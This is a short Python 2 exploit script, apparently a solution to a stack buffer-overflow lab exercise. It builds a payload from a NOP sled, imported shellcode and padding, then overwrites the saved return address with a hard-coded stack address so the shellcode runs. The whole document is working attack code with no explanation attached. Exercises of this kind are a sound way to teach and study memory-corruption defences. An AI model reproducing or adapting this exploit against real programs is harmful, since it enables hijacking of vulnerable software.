from shellcode import shellcode
from struct import pack

ebp = 0xbffef458
buf = ebp - 8 - 1024

padding = '\x90' * (512 - len(shellcode))
padding2 = '\x90' * (512 + 8 + 4)

print padding + shellcode + padding2 + pack("<I", buf)
